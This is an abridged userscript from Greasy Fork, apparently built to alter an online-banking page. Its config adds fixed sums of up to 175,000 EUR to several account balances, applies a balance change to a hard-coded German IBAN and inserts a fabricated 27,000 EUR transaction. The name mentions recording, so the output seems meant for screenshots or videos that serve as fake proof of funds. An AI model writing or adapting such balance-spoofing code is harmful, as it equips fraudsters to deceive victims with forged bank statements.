// ==UserScript==
// @name         Ed Start 4Rec spr.Herbeck-wirtschaftsberatung@web.de
...
// @downloadURL https://update.greasyfork.org/scripts/545926/Ed%20Start%204Rec%20sprHerbeck-wirtschaftsberatung%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/545926/Ed%20Start%204Rec%20sprHerbeck-wirtschaftsberatung%40webde.meta.js
// ==/UserScript==


//FINÜBERSICHT
    const BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 100000 },  // 110000
        { index: 1, adjustmentAmount: 100000 },// 110000
        { index: 2, adjustmentAmount: 65000 },
        { index: 3, adjustmentAmount: 10000 },
        { index: 4, adjustmentAmount: 175000 },// 110000
        { index: 7, adjustmentAmount: 175000 }, // 110000
        { index: 4, adjustmentAmount: 0 }
        // Add more as needed
    ];

// UMSATZE & KONTODETAILS BALANCE
  const IBAN_CHECK_RAW = 'DE12 8605 5592 1898 4092 06';      //

   const DELTA_EUR = 100000; // ← change this value // 110000
...
// UMSATZE TRANSAKTIONEN
  ...
  const transactions = [{
    ...
    },
    {
      ...
      amountText: "27.000,00 EUR",
      dateGroup: "17.12.2025",  // 17.12.2025
      insertMode: "2",
      positionOffset: 0,
      link: "https://example.com/tx-1"
},
